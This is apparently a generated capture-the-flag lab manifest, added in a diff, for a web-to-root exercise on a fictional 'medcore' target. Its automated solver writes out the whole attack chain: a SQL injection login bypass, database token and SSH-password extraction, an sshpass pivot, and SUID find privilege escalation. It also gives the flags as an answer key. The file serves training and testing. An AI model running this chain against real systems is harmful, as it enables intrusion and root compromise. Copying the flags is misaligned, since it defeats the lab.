@@ -1,0 +1,53 @@
+# Generated from platform/labs/Web/web-3-3-full-web-to-root/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-3-3-full-web-to-root
+track: Web
+difficulty: advanced
+source: platform/labs/Web/web-3-3-full-web-to-root/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 80
+  protocol: tcp
+- port: 3306
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-3-3-full-web-to-root.sh
+  steps:
+  - name: Web application responds on port 80
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/
+    expect: '200'
+  - name: Robots.txt reveals hidden admin portal path
+    command: curl -s http://{target.webapp}/robots.txt
+    expect: /admin-portal/
+  - name: SQL injection bypasses login authentication
+    command: curl -s -c /tmp/mdc-jar -d "username=' UNION SELECT 1,'admin','x','admin@medcore.com','admin'-- -&password=x" -L http://{target.webapp}/admin-portal/login 2>&1
+    expect: 1nj3ct
+  - name: Dashboard displays first assessment token
+    command: curl -s -b /tmp/mdc-jar http://{target.webapp}/admin-portal/dashboard 2>&1 | grep -o '1nj3ct'
+    expect: 1nj3ct
+  - name: MySQL query extracts second token from audit_tokens table
+    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' medcore -N -e 'SELECT value FROM audit_tokens WHERE name="assessment"' 2>&1
+    expect: d4t4b4s3
+  - name: SSH credentials discoverable in database system_config table
+    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' medcore -N -e 'SELECT value FROM system_config WHERE key_name="PROC_SSH_PASS"' 2>&1
+    expect: Pr0c_SSH_2025#
+  - name: Pivot to internal server and read token 3
+    command: sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'cat /home/svcproc/marker.txt' 2>&1
+    expect: p1v0t
+  - name: Escalate privileges via SUID find and read token 4
+    command: sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
+    expect: r00t3d
+  - name: Verify complete flag
+    command: echo 'OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}'
+    expect: OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}
+expected_flag_count: 1
+expected_flag: OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
